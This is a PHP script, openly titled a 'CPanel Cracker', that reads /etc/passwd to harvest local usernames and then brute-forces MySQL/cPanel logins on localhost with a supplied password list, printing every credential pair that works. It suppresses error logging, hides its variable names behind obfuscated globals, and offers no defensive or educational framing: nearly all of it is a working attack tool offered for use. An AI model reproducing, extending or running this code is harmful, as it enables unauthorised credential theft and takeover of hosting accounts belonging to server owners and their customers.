<?php
/*
Copyright {2015} {Ahmed Alarbi}

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

Don't delete this, respect the coder who shared it for free.
Title: 3Turr ~ CPanel Cracker
By: 3Turr
Contact: facebook.com/ahmed.f.alarbi
note: This script is the fastest cracker for CPanels you can run.
*/
@error_reporting(0);
@set_time_limit(0); 
ini_set('memory_limit', '-1');
@ini_set('max_execution_time', 0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@set_magic_quotes_runtime(0);

${"GLOBALS"}["srpuccung"] = "a1";
${"GLOBALS"}["ucnibgygdq"] = "e";
$ {"GLOBALS"}["oibbfucdc"] = "value";
$ {"GLOBALS"}["oykssljtvlz"] = "k";
$ {"GLOBALS"}["lsccxrnbhw"] = "username";
$ {"GLOBALS"}["zmerlgzk"] = "a2";
$ {"GLOBALS"}["rrkfvuyt"] = "id2";
$ {"GLOBALS"}["kpmbrod"] = "ok";
$ {"GLOBALS"}["srpuccung"] = "a1";
$ {"GLOBALS"}["mpkqzbudyse"] = "user";
$ {"GLOBALS"}["szfyjop"] = "i";
$ {"GLOBALS"}["hrqpjl"] = "pass";
$ {"GLOBALS"}["otmvwuyr"] = "users";
$turrusers = '';
echo '<!DOCTYPE html><head><meta http-equiv="Content-Language" content="en-us" /><meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Turr ~ CP-JAGUAR</title><link rel="shortcut icon" type="image/x-icon" href="http://im51.gulfup.com/2bRHM4.png"><style type="text/css">#checkouttextarea {webkit-border-radius: 15px;}a:link {color:red;}a:visited {color:red;}a:hover {color:#bbbbbb;}a:active {color:white;}:hover#checkouttextarea {opacity: 0.8; background-color:333333}</style></head><body bgcolor="#000000" >';
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
   
  echo '
	<br><br><center><font style="font-family: Courier ;font-size:32px;color:red;" ><br>OMG, This is NOT for windows "skiddie"</font><br>
	';
    exit;
} else {

${${"GLOBALS"}["otmvwuyr"]}=@file("/etc/passwd");
foreach(${${"GLOBALS"}["otmvwuyr"]} as ${${"GLOBALS"}["yfwryin"]}){

${${"GLOBALS"}["nnpehjs"]}=explode(":",${${"GLOBALS"}["yfwryin"]});
$turrusers .= ${${"GLOBALS"}["nnpehjs"]}[0]."
";
}

if($_POST["page"]=="find"){
echo "<div style='color:white;'>";
if(isset($_POST["usernames"])&&isset($_POST["passwords"])){
	$khkloqz="username";
		${${"GLOBALS"}["lsccxrnbhw"]}=str_replace("
"," ",$_POST["usernames"]);
	
	$xgqckjprblr="a1";
	${$xgqckjprblr}=explode(" ",${$khkloqz});
	${${"GLOBALS"}["zmerlgzk"]}=explode("
",$_POST["passwords"]);
	${${"GLOBALS"}["rrkfvuyt"]}=count(${${"GLOBALS"}["zmerlgzk"]});
	${${"GLOBALS"}["kpmbrod"]}=0;
	echo "<font style=\"text-shadow: 1px 1px 36px #000, 0 0 25px #000, 0 0 30px #000;color:red;position:fixed;font-size:23px;left:10px;top:10px;\"><a href='https://www.facebook.com/ahmed.f.alarbi' target='_blank' >3Turr</a></font>";
	foreach(${${"GLOBALS"}["srpuccung"]} as${${"GLOBALS"}["mpkqzbudyse"]}){
		if(${${"GLOBALS"}["mpkqzbudyse"]}!==""){$ulbrgxfihqki="user";
			$ydybrefvjub="i";
			${"GLOBALS"}["kcvbiniknq"]="i";${"GLOBALS"}["nvdxqedgj"]="user";
			${$ulbrgxfihqki}=trim(${${"GLOBALS"}["nvdxqedgj"]});
			for(${${"GLOBALS"}["kcvbiniknq"]}=0; ${${"GLOBALS"}["szfyjop"]}<=${${"GLOBALS"}["rrkfvuyt"]}; ${$ydybrefvjub}++){$xmmycmyvjwrh="user";
				${${"GLOBALS"}["hrqpjl"]}=trim(${${"GLOBALS"}["zmerlgzk"]}[${${"GLOBALS"}["szfyjop"]}]);
				if(@mysql_connect("localhost",${$xmmycmyvjwrh},${${"GLOBALS"}["hrqpjl"]})){
					echo "3Turr ~ ";
					if (${${'GLOBALS'}['hrqpjl']} == '' or null){echo "MySQL ";}else{ echo "CP ";}
					echo"user is (<b><font color=red>$user</font></b>) Password is (<b><font color=red>${${'GLOBALS'}['hrqpjl']}</font></b>)<br />";
					$cwcsyolw="ok";
					${$cwcsyolw}++;
				}
			}
			}
	}echo"
	<hr style='border-color:red;'><b>You Found <font color=red>$ok</font> Cpanel Found, By 3Turr.</b>";echo"<center><b><a href=".$_SERVER["PHP_SELF"]."><~ BACK</a>";exit;}
	}
echo  "<center><div>
<font style='color:red;font-size:32px;top:50%;'>3Turr ~ CP-JAGUAR</font><br>
<img src='https://lh4.googleusercontent.com/-NyMjAgEFuXk/VQ-yVuLgcaI/AAAAAAAAATY/ytIQmISLZnU/w244-h115-no/jag.png' align='center' style='position:fixed;left:42.6%;index-z:-1;' /><br><br><br><br>
<font style='left:42.6%;color:red;ont-size:12px;top:50%;'>The Fastest CP cracker EVER</font></div>
<br><form method=\"POST\" target=\"_blank\" style='color:red;' >
<strong>
<input name=\"page\" type=\"hidden\" value=\"find\">				
</strong>
<font style='font-size:22px;top:50%;font-family: Courier ;'>User's :</font><br>
<strong>
<textarea wrap='off' cols=\"90\" rows=\"9\" name=\"usernames\" style='outline: none;overflow: auto;resize:none;border:2px dashed red; border-radius:8px;font-family:Tahoma;color:red;background-color:#222222'>$turrusers</textarea></strong>
<br>
<font style='font-size:22px;top:50%;font-family: Courier ;'>Pass's :</font><br>
<strong><textarea placeholder='                                                                        By 3Turr' cols=\"90\" rows=\"9\" name=\"passwords\" style='outline: none;border:2px dashed red;border-radius:8px; font-family:Tahoma;color:red;background-color:#222222' ></textarea></strong>
<br><br>
<strong>
<input type=\"submit\" value=\"3Turr ~ CP\" style='outline: none;background-color:#222222; border-radius:8px; -moz-border-radius:10px; border-color:red; width:8%; color:red ;'>
</strong>
</form>
<font style=\"text-shadow: 1px 1px 36px #000, 0 0 25px #000, 0 0 30px #000;color:red;position:fixed;font-size:23px;left:10px;top:10px;\"><a href='https://www.facebook.com/ahmed.f.alarbi' target='_blank' >3Turr</a></font>
";
}
?>